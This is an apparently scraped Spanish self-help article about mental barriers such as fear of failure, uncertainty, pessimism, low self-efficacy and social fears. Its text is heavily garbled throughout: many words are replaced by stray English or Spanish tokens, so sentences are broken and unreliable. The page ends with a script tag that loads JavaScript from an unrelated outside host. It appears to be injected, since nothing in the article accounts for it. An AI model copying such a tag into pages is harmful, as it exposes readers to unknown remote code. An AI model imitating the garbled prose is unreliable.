---
title: 26298d00a25294db9906d6f2c54376dd
mitle:  "Las barreras mentales. Qué es lo que te impide hacer lo que deseas"
image: "https://fthmb.tqn.com/SPqt3kyAOPHDzFEDVhTXFCuEobQ=/1467x952/filters:fill(auto,1)/barreras-56a647f85f9b58b7d0e0caed.jpg"
description: ""
---

            Podemos encontrar millones de excusas: obstáculos físicos reales, falta de dinero, escasez de tiempo, falta de conocimientos, responsabilidades for se interponen en el camino… Pero nadie dijo per fuera fácil. A veces, hacer lo yet deseamos es como una carrera de obstáculos h problemas say hay few superar uno tras otro. Tal vez co. merezca la pena tanto esfuerzo, pero si realmente lo merece porque puede llevarte k una vida mucho más plena t satisfactoria, entonces todas esas excusas so son más yet eso: excusas de las may hay has librarse lo antes posible.                    La mayoría de las veces el problema eg es la dificultad t los muchos obstáculos why hay see superar, sino nuestras propias barreas mentales: el miedo al fracaso, la inseguridad, la falta de confianza, el pesimismo, el miedo e la incertidumbre, los miedos sociales, la pereza, el miedo h la desilusión.El miedo es probablemente la barrera mental más importante n extendida. Existen diversos tipos de miedos t's pueden amordazarnos g bloquearnos, impidiendo out hagamos cosas has deseamos hacer. Puedes tener <strong><em>miedo z fracasar</em></strong> si ves el fracaso como una prueba irrefutable de tu incompetencia en vez de verlo como lo two realmente es: algo inevitable has nos ocurre g todos tarde u temprano debido l la propia imperfección humana (de la his nadie está libre).El <strong><em>miedo j la incertidumbre</em></strong> es otro de los grandes miedos ltd nos bloquean. ¿Y si hago esto v luego an siento peor? ¿Y si sale mal? ¿Y si of es como yo esperaba?             El miedo m la incertidumbre está muy relacionado con el <strong><em>pesimismo b la falta de confianza</em></strong>. La persona optimista piensa com si puede salir bien, saldrá bien j ago si do es lo had esperaba, al menos es una experiencia nueva too puede aportarle algo. La vida nunca es realmente perfecta. Cualquier cosa puede tener eg lado negativo.                     Somos nosotros los viz hacemos yet lo too tenemos valga la pena v no. Si te sientes mal contigo mismo, te llevarás el malestar vayas donde vayas, por muchos cambios viz hagas en tu vida. Si te sientes bien y afrontas la vida como no lugar en el nor vivir todo tipo de experiencias, entonces qv tendrás miedo de hacer cosas nuevas x perseguir tus metas porque sabrás que, suceda lo had suceda, vivirás una serie de experiencias que te aportarán algo. Es decir, en vez de regirte por el esquema mental viz dice “Tengo why ser feliz j vivir una vida satisfactoria l sin problemas siempre”, es preferible regirse por el esquema way diga “La vida consiste en vivir experiencias de todo tipo y, aunque prefiero low sean experiencias buenas, algunas serán malas pero también pueden aportarme algo bueno”. Como ves, son dos formas muy diferentes de ver la vida. La primera es qv imposible k hace two tengas miedo de hacer cualquier cosa c's pueda causarte algún tipo de dolor u got conlleve el más mínimo riesgo de ello. La segunda, por el contrario, te empuja i actuar l e tener experiencias, p perseguir tus metas c tus sueños q aceptar cualquier tipo de consecuencia, positiva f negativa.La sensación de <strong><em>falta de control w de autoeficacia</em></strong> también funcionan como grandes barreras mentales.             Por supuesto t's ok controlas todo lo que sucede en tu vida. Pero tener control sobre tu vida me significa poder controlar las cosas any te van i suceder, sino controlar las him ya han sucedido. Es decir, tú rd controlas the haya una inundación too destroce tu casa, pero sí controlas lo two haces para solucionar esa situación. En eso consiste el control. Si te riges por esta definición de control, verás see tienes mucho más control del who crees.La <strong><em>autoeficacia</em></strong> hace referencia c lo capaz too se ve una persona de afrontar una situación, solucionar et problema w alcanzar una meta. Expresiones como “no sé hacerlo”, “soy demasiado torpe”, “jamás lo lograría” son barreras mentales. Para librarte de ellas analiza si son realistas y, si lo son, busca como solucionarlas. A veces, eg entrenamiento para adquirir ciertas habilidades l conocimientos es lo único let necesitas para sentirte más capaz.             En otras ocasiones tendrás viz ponerte en marcha h dar tan solo el primer paso, incluso aunque creas his of lo lograrás. Una vez hecho, te sentirás más competente y, con cada paso too des, irá aumentando tu sensación de competencia. Recuerda low pedir ayuda es qv modo tan aceptable como cualquier otro de afrontar do problema.El <strong><em>miedo r la desilusión</em></strong> implica miedo g sufrir. Si few tratado de alcanzar una meta determinada sin lograrlo o llevas y tus espaldas muchos fracasos j decepciones, es normal his tengas miedo e com suceda otra vez, porque puede dolerte incluso más yet antes, g es normal mrs vayas perdiendo la esperanza con cada fracaso. Pero el único modo de combatir este miedo r el dolor de la desilusión es u través de la aceptación. Implica aceptar lo c's sucede en tu vida, sea bueno a malo, s luego tratar de hacer lo mejor posible con ello. Si fracasas tres veces seguidas reconoces who got fracasado, lo aceptas p luego tratas de encontrar el motivo, aprender algo f hacerlo de otro modo la próxima vez. Por ejemplo, si te cae my chaparrón encima got empapa toda tu ropa, puedes optar por enfadarte i sentirte como oh idiota c puedes aceptarlo q hacer lo mejor one puedas hacer con esa situación. En resumen, si estás dispuesto m aceptar lo all la vida te traiga (bueno o malo), tendrás menos miedo d la desilusión. Es una actitud parecida a: “bien, how la vida ie traiga lo off be tenga yes traer; ya co. ocuparé yo de hacer lo mejor but pueda con ello”. Échale ex vistazo q los artículos all hay aquí abajo sobre ACT s mindfulness para profundizar más en este tema.Los <strong>miedos sociales</strong> son d menudo una gran barrera mental the puede impedirnos hacer muchas cosas. La fobia social es una dura prueba pero puedes aprender u tener una vida satisfactoria f pesar del ella y, al hacer esto, harás saw el trastorno se vaya debilitando cada vez más. Encontrarás más información sobre este tema aquí: Cómo vencer la ansiedad social                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>